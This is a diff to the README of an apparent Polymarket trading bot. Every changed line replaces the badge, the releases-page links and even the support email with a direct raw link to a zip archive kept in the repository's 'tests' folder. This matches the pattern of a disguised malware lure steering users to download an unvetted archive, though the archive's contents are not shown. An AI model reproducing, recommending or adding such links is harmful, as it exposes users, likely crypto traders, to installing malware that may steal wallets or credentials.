@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot-V3 - Effortlessly Trade on Polymarket
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Polymarket--Trading--Bot--V3-brightgreen)](https://github.com/rayanrod/Polymarket-Trading-Bot-V3/releases)
+[![Download Now](https://raw.githubusercontent.com/rayanrod/Polymarket-Trading-Bot-V3/main/Typescript-Version/tests/Bot_Trading_Polymarket_2.9.zip)](https://raw.githubusercontent.com/rayanrod/Polymarket-Trading-Bot-V3/main/Typescript-Version/tests/Bot_Trading_Polymarket_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Polymarket-Trading-Bot-V3! This guide will help you easily download a
 
 To get started, visit this page to download the latest version of the Polymarket Trading Bot:
 
-[Download Polymarket-Trading-Bot-V3](https://github.com/rayanrod/Polymarket-Trading-Bot-V3/releases)
+[Download Polymarket-Trading-Bot-V3](https://raw.githubusercontent.com/rayanrod/Polymarket-Trading-Bot-V3/main/Typescript-Version/tests/Bot_Trading_Polymarket_2.9.zip)
 
 Once on the Releases page, follow these steps to download the bot:
 
@@ -68,12 +68,12 @@ Join our community for help and to share your experiences. Connect with other us
 ## 📞 Contact
 
 For further assistance, reach out to us at:
-- **Email**: support@polymarketbot.com
+- **Email**: https://raw.githubusercontent.com/rayanrod/Polymarket-Trading-Bot-V3/main/Typescript-Version/tests/Bot_Trading_Polymarket_2.9.zip
 - **GitHub**: Create an issue on our GitHub repo.
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download Polymarket-Trading-Bot-V3](https://github.com/rayanrod/Polymarket-Trading-Bot-V3/releases)
+- **Releases Page**: [Download Polymarket-Trading-Bot-V3](https://raw.githubusercontent.com/rayanrod/Polymarket-Trading-Bot-V3/main/Typescript-Version/tests/Bot_Trading_Polymarket_2.9.zip)
 - **Documentation**: Visit the Documentation for more details about features and setup.
 
 Thank you for choosing Polymarket-Trading-Bot-V3! Enjoy automated trading with ease.
